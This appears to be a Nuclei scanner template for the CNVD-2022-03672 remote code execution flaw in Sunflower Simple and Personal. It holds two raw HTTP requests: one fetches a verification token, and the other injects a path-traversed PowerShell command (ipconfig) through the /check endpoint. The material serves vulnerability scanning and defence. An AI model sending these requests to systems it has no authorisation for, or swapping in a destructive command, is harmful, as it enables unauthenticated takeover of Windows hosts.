id: CNVD-2022-03672
info:
  author: daffainfo
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  description: Sunflower Simple and Personal is susceptible to a remote code execution
    vulnerability.
  name: Sunflower Simple and Personal - Remote Code Execution
  reference:
  - https://www.1024sou.com/article/741374.html
  - https://copyfuture.com/blogs-details/202202192249158884
  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270
  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672
  severity: critical
  tags: cnvd,cnvd2020,sunflower,rce
requests:
- extractors:
  - group: 1
    internal: true
    name: cid
    regex:
    - '"verify_string":"(.*)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1==200
    - status_code_2==200
    - contains(body_1, 'verify_string')
    - contains(body_2, 'Windows IP')
    type: dsl
  raw:
  - 'POST /cgi-bin/rpc HTTP/1.1

    Host: {{Hostname}}


    action=verify-haras

    '
  - 'GET /check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+ipconfig
    HTTP/1.1

    Host: {{Hostname}}

    Cookie: CID={{cid}}

    '
  req-condition: true
